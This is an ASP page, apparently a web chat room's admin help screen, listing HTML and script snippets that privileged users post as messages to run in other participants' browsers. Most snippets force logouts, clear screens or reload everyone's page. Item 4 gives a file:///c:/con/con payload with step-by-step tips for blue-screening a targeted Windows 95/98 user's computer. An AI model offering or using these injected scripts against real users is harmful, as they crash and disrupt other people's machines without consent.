<%@ LANGUAGE=VBScript%>
<%
nickname=Session("fy_u_nickname")
grade=Int(Session("fy_u_userinfo")(0))
if nickname="" then Response.Redirect "manerr.asp?id=100"
if grade<>10 then Response.Redirect "manerr.asp?id=250"%><html>
<head>
<title>HTML妙用</title>
<meta http-equiv="Content-Type" content="text/html; charset=gb2312">
<link rel="stylesheet" href="readonly/style.css">
</head>
<body oncontextmenu=self.event.returnValue=false bgcolor="#FFFFFF" class=p150>
<div align="center">
<h1><font color="0099FF">【HTML妙用】</font></h1>
</div>
<div align="center"><a href="javascript:history.go(0)">刷新</a></div>
<hr noshade size="1" color=009900>
<b>［注意事项］</b><br>
　　本聊天室可以自由设定允许使用ＨＴＭＬ的等级，建议设成１０级。通过ＨＴＭＬ可以实现一些特殊的功能。请参数下面的示例： 
<hr noshade size="1" color=009900>
１、让聊天室中所有的人都自动存点退出，需要重新登录才能进入。<br>
　　代码： <font color="red">&lt;script&gt;parent.location.href="exit.asp";&lt;/script&gt;</font><br>
２、让选中“滚屏”（即自动滚屏）的人自动存点退出，需要重新登录才能进入。<br>
　　代码： <font color="red">&lt;script&gt;if(parent.f2.document.af.as.checked==1)parent.location.href="exit.asp";&lt;/script&gt;</font><br>
３、让未选中“滚屏”的人自动存点退出，需要重新登录才能进入。<br>
　　代码： <font color="red">&lt;script&gt;if(parent.f2.document.af.as.checked!=1)parent.location.href="exit.asp";&lt;/script&gt;</font><br>
４、让某个使用 Win95/98 的捣乱者蓝屏死机。<br>
　　⑴选中该用户，并使用私聊，以免其他使用WIN95/98的人也死机。<br>
　　⑵通常用户都会选中“自动滚屏”一项，所以为了避免炸到自己，就去掉“滚屏”前的复选框。<br>
　　⑶输入代码： <font color="red">&lt;script&gt;if(parent.f2.document.af.as.checked!=0)window.open("file:///c:/con/con");&lt;/script&gt;</font><br>
５、清除所有人的屏幕。<br>
　　代码： <font color="red">&lt;script&gt;parent.t.location.href=&quot;f1.asp&quot;;&lt;/script&gt;</font><br>
６、让所有人都全屏刷新（相当于按Ｆ５键）<br>
　　代码： <font color="#FF0000">&lt;script&gt;parent.location.href=&quot;hqtchat.asp&quot;;&lt;/script&gt;</font><br>
７、发醒目的大字。<br>
　　代码： <font color="#FF0000">&lt;font color=red face=隶书 style=font-size:70pt&gt;请大家注意&lt;/font&gt;</font><br>
８、贴图。<br>
　　代码： <font color="#FF0000">&lt;img src=图片的URL地址&gt;</font><br>
９、待续…… 
<hr noshade size="1" color=009900>
　　有时会发现对某个用户似乎不起作用，原因可能是该用户已经不在聊天室中了（掉线或卡住了），还有可能该用户使用了“２”级过滤，对大家说的话他看不到，这时可以选中该用户，再对他发一遍代码即可。但是，倘若该用户屏蔽了你的话，那就不起作用了。
<hr noshade size="1" color=009900>
<div align=center class=cp><%Response.Write "序列号：<font color=blue>" & Application("fy_c_sn") & "</font>，授权给：<font color=blue>" & Application("fy_c_user") & "</font><br><font color=999999>" & Application("fy_c_copyright") & "</font>"%></div>
</body>
</html>
